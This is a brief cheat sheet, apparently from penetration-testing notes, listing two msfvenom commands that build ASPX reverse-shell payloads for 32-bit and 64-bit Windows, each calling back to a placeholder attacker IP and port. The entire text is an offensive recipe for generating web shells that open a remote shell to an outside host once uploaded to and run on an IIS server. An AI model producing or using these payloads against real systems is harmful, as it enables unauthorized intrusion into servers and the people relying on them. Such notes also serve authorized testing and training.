# ASPX

1. x86 (32-bit) Payloads

`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86.aspx`

2. x86_64 (64-bit) Payloads

`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86-64.aspx`